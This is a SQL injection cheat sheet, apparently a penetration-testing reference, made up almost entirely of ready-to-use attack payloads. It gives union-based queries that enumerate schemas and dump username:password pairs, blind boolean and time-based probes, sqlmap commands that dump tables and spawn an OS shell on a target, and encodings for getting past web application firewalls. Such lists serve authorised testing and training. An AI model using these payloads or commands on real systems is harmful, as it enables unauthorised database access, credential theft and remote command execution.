# SQL Injection (SQLi) Cheat Sheet

## Detection
- Add `'` or `"` to parameters, check for SQL errors
- Try `1 OR 1=1`, `1' OR '1'='1`, `1" OR "1"="1`
- Time-based: `1' AND SLEEP(5)--`
- Error-based: `1' AND EXTRACTVALUE(1, CONCAT(0x7e, VERSION()))--`

## Union-Based SQLi
```
' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
' UNION SELECT 1,2,3--
' UNION SELECT 1,group_concat(table_name),3 FROM information_schema.tables WHERE table_schema=database()--
' UNION SELECT 1,group_concat(column_name),3 FROM information_schema.columns WHERE table_name='users'--
' UNION SELECT 1,group_concat(username,0x3a,password),3 FROM users--
```

## Blind SQLi (Boolean)
```
' AND 1=1--    (true)
' AND 1=2--    (false)
' AND SUBSTRING(database(),1,1)='a'--
' AND (SELECT COUNT(*) FROM users)>0--
```

## Blind SQLi (Time-based)
```
' AND IF(1=1, SLEEP(5), 0)--
' AND IF(SUBSTRING(database(),1,1)='a', SLEEP(5), 0)--
```

## SQLMap Usage
```bash
sqlmap -u "http://target/page?id=1" --dbs
sqlmap -u "http://target/page?id=1" -D dbname --tables
sqlmap -u "http://target/page?id=1" -D dbname -T users --dump
sqlmap -u "http://target/page?id=1" --os-shell
# POST request
sqlmap -u "http://target/login" --data="user=admin&pass=test" --dbs
# With cookies
sqlmap -u "http://target/page?id=1" --cookie="session=abc123" --dbs
```

## WAF Bypass Techniques
- Case variation: `SeLeCt`, `UnIoN`
- Comment injection: `UN/**/ION SE/**/LECT`
- Double URL encoding: `%2527` for `'`
- Using `||` instead of `OR`, `&&` instead of `AND`
- Hex encoding: `SELECT 0x61646d696e` (= 'admin')
- Space bypass: `UNION%0aSELECT`, `UNION%09SELECT`, `UNION/**/SELECT`

## Common Database Fingerprinting
| Database   | Version Query            | Comment Style |
|-----------|--------------------------|---------------|
| MySQL     | `SELECT VERSION()`       | `-- ` `#`     |
| PostgreSQL| `SELECT version()`       | `--`          |
| SQLite    | `SELECT sqlite_version()`| `--`          |
| MSSQL     | `SELECT @@VERSION`       | `--`          |
| Oracle    | `SELECT banner FROM v$version` | `--`    |
